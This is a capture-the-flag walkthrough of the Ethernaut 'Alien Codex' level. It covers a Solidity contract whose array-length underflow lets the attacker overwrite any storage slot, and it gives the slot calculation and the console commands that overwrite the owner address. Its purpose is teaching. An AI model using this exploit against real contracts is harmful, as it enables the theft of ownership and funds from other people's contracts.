# 19 - Alien Codex

## Challenge

You've uncovered an Alien contract. Claim ownership to complete the level.

Things that might help

- Understanding how array storage works
- Understanding [ABI specifications](https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html)
- Using a very `underhanded` approach

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function makeContact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

## Summary

We are provided with `AlienCodex` contract which implements `Ownable`. It has an array `codex` and we can add, remove and modify its elements. The goal is to claim ownership of the contract.

The vulnerability is obvious here.

```js
function retract() contacted public {
    codex.length--;
}
```

`retract()` reduces `codex` array size by 1. However it does not check if the array is empty, in which case underflow happens. If we call `retract()` when array size is 0, it will become `2**256 - 1`. Recall that EVM has storage of `2**256` slots, so we can now essentially overwrite any slot we want. Looking at [Ownable](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol#L21), it apparently includes a `address private _owner;` variable. Our goal is to overwrite it with our address and claim ownership.

So the only question is which slot out of `2**256` is `_owner` stored in? Here I referenced a table of how array and values are stored in EVM:

| Slot #           | Variable                                                       |
|------------------|----------------------------------------------------------------|
| 0                | contact bool(1 bytes) & owner address (20 bytes)               |
| 1                | codex.length                                                   |
| keccak256(1)     | codex[0]                                                       |
| keccak256(1) + 1 | codex[1]                                                       |
| ...              | ...                                                            |
| 2²⁵⁶ - 1         | codex[2²⁵⁶ - 1 - uint(keccak256(1))]                           |
| 0                | codex[2²⁵⁶ - 1 - uint(keccak256(1)) + 1] --> can write slot 0! |

`codex[a]` corresponds to slot `keccak256(1) + a`. We want `codex[x]` that will correspond to slot 0. Subtracting both sides or the original `codex[a]` entry by `keccak256(1) + a`, we get `x = -keccak256(1)`, which rounds to `codex[2²⁵⁶ - uint(keccak256(1))]`. Overwriting this entry can then let us change the value of `_owner` to our address.

## Walkthrough

First set `bool public contact` to true to bypass the `contacted` modifier, and then call `retract()` to cause underflow.

```js
> await contract.makeContact()
{tx: '0xf5edb9b59a5cba8977e3728906042ec16cfe4cfb3b2a18192450bd1e4ddbc833', receipt: {…}, logs: Array(0)}
> await contract.retract()
{tx: '0x6bd5809413cf7ce6312d6f7b337bfc7ac83c14e453220f3dc9e9ffeee2085b62', receipt: {…}, logs: Array(0)}
```

Now let's calculate the index. `web3.utils.keccak256` takes parameter from `web3.eth.abi.encodeParameters(['type', 'value']`.

```js
> web3.utils.keccak256(web3.eth.abi.encodeParameters(['uint256'], ['1']))
'0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6'
> BigInt(2**256) - BigInt('0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6')
35707666377435648211887908874984608119992236509074197713628505308453184860938n
```

To overwrite this slot to desired value, recall that `_owner` is before `bool contact` in storage. The actual 32-byte value is in reverse order, i.e. first boolean then our wallet address. `player` is 20 bytes, so we need 12 bytes at the left: `0x0000000000000000000000010b26C24d538e3dfF58F7c733535e65a6674FB3aB`. We can then call `revise()` to overwrite the slot.

```js
> await contract.revise(35707666377435648211887908874984608119992236509074197713628505308453184860938n, '0x0000000000000000000000010b26C24d538e3dfF58F7c733535e65a6674FB3aB')
{tx: '0x1ae37dea80ef66ac4d2a7b3e61ad766a4097853352bde8744b88d29830c52b45', receipt: {…}, logs: Array(0)}
> await contract.owner()
'0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB'
```

Finally, submit the instance to pass the level.

## Afterword

This level exploits the fact that the EVM doesn't validate an array's ABI-encoded length vs its actual payload.

Additionally, it exploits the arithmetic underflow of array length, by expanding the array's bounds to the entire storage area of `2^256`. The user is then able to modify all contract storage.